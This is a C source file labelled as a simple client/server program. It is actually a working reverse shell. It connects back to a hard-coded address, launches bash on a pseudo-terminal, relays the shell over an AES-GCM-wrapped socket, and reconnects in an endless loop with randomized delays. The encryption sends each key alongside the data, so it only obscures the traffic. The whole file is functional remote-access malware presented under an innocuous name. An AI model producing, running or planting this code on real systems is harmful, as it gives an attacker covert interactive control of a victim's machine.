//Simple ==Client/Server==

#define _GNU_SOURCE

#include <stdlib.h>
#include <pty.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <netinet/tcp.h>
#include <termios.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>

#define BUFFER 4096
#define PORT 3000
#define IP "192.168.0.100"

#define KEY_SIZE 32
#define NONCE_SIZE 12
#define TAG_SIZE 16

int encrypt_gcm(
    const unsigned char in[],
    int in_len, const unsigned char key[],
    unsigned char nonce[],
    unsigned char out[],
    unsigned char tag[]){

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        int len = 0;
        int total = 0;

        if (ctx == NULL){
            return -1;
        }

        if(RAND_bytes(nonce, NONCE_SIZE) != 1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }

        if(EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)!=1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }

        if(EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce)!=1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }

        if(EVP_EncryptUpdate(ctx, out, &len, in, in_len)!=1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }

        total=len;

        if(EVP_EncryptFinal_ex(ctx, out + total, &len)!=1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }

        total+=len;

        if(EVP_CIPHER_CTX_ctrl(
            ctx, 
            EVP_CTRL_GCM_GET_TAG, 
            TAG_SIZE, 
            tag)!=1){
                EVP_CIPHER_CTX_free(ctx);
                return -1;
            }

        EVP_CIPHER_CTX_free(ctx);

        return total;

    }

int decrypt_gcm(
    const unsigned char in[],
    int in_len,
    unsigned char out[],
    const unsigned char key[],
    unsigned char nonce[],
    unsigned char tag[]){


        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        int total, len = 0;
        int ret;


        if(EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)!=1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }

        if(EVP_DecryptInit_ex(ctx, NULL, NULL, key, nonce)!=1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }

        if(EVP_DecryptUpdate(ctx, out, &len, in, in_len)!=1){
            EVP_CIPHER_CTX_free(ctx);
            return -1;
        }
        total=len;

        if(EVP_CIPHER_CTX_ctrl(
            ctx, 
            EVP_CTRL_GCM_SET_TAG, 
            TAG_SIZE, 
            (void *)tag)!=1)
            {
                EVP_CIPHER_CTX_free(ctx);
                return -1;
            }

        ret = EVP_DecryptFinal_ex(ctx, out + total, &len);
        
        if(ret <= 0){
            EVP_CIPHER_CTX_free(ctx);
            return -2;
        }
        
        total+=len;

        EVP_CIPHER_CTX_free(ctx);

        return total;

    }


int recv_full(int s, unsigned char buff[], int len){
    int total = 0;

    while(total < len){
        int r = recv(s, buff+total, len-total, 0);
        if(r <= 0) return -1;
        total+=r;
    }

    return total;
}

int recv_packet(int s, unsigned char buff[]){
    int size_to_network, size_to_host;

    if(recv_full(s, (unsigned char*)&size_to_network, 4) != 4){
        return -1;
    }

    size_to_host = ntohl(size_to_network);

    if(recv_full(s, buff, size_to_host) <= 0){
        return -1;
    }

    return size_to_host;
}

int send_packet(int s, unsigned char buff[], int len){
    int size_to_network = htonl(len);
    int totalsize = 0;
    int total = 0;

    while(totalsize<4){
        int sen = send(s, (unsigned char *)&size_to_network + totalsize, 4 - totalsize, 0);
        if(sen<=0) return -1;
        totalsize+=sen;
    }


    while (total<len)
    {
        int sent = send(s, buff+total, len-total, 0);
        if(sent<=0) return -1;
        total+=sent;
    }

    return 0;
}

void run_session(int sock){

    int master;
    pid_t shell_pid;
    if((shell_pid = forkpty(&master, NULL, NULL, NULL)) == 0){
        execl("/bin/bash", "bash", NULL);
        exit(0);
    }

    unsigned char dec[BUFFER];
    unsigned char enc[BUFFER];
    unsigned char buff[BUFFER];

    unsigned char tag[TAG_SIZE];
    unsigned char nonce[NONCE_SIZE];

    unsigned char key_send[32];
    unsigned char key_recv[32];

    RAND_bytes(key_send, KEY_SIZE);

    while (1)
    {
        fd_set fds;
        FD_ZERO(&fds);

        FD_SET(sock, &fds);
        FD_SET(master, &fds);

        int maxfds = sock > master ? sock : master;

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 5000;

        int r = select(maxfds + 1, &fds, NULL, NULL, &tv);

        if(r < 0){
            break;
        }

         if (r == 0)
        {
            continue;
        }

        int status;
        pid_t result = waitpid(shell_pid, &status, WNOHANG | WUNTRACED);

        if(result > 0){
            if(WIFSTOPPED(status)){
                break;
            }

            if(WIFEXITED(status)||WIFSIGNALED(status)){
                break;
            }
        }

        if(FD_ISSET(sock, &fds)){
            int k = recv_packet(sock, key_recv);
            int nc = recv_packet(sock, nonce);
            int bytes = recv_packet(sock, buff);
            int tags = recv_packet(sock, tag);

            if(bytes<=0) break;

            int dec_len = decrypt_gcm(buff, bytes, dec, (const unsigned char*)key_recv, nonce, tag);

            if(dec_len<=0) break;

            if(dec_len == -2) break;

            write(master, dec, dec_len);
        }

        if(FD_ISSET(master, &fds)){
            int bytes = read(master, buff, sizeof(buff));

            if(bytes<=0) break;

            int enc_len = encrypt_gcm(buff, bytes, (const unsigned char*)key_send, nonce, enc, tag);

            if(enc_len<=0) break;
            if(send_packet(sock, key_send, KEY_SIZE) != 0) break;
            if(send_packet(sock, nonce, NONCE_SIZE) != 0) break;
            if(send_packet(sock, enc, enc_len) != 0) break;
            if(send_packet(sock, tag, TAG_SIZE) != 0) break;
  
        }

    }
    close(master);

}

int main(){

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));

    addr.sin_port = htons(PORT);
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, IP, &addr.sin_addr);

    while (1)
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);

        int opt = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));

        if(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0){
            close(sock);
            sleep(5);
            continue;
        }

        run_session(sock);

        shutdown(sock, SHUT_RDWR);
        close(sock);

        sleep(2 + rand()%3);

    }

    return 0;
    
}
